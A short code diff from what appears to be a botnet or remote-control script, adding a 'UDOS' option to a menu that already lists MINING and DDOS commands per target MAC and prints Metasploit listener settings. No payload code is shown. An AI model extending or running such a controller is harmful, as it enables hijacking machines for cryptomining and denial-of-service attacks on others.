@@ -15,7 +15,7 @@ if os.path.exists(file_to_delete):
 
 while True:
     mac = input("Enter Mac: ")
-    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS) : ")
+    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS/UDOS) : ")
     if option == "START":
         print("Use Metasploit Tool in | LPORT : 8070 | LHOST : 127.0.0.1")
     elif option == "STOP":
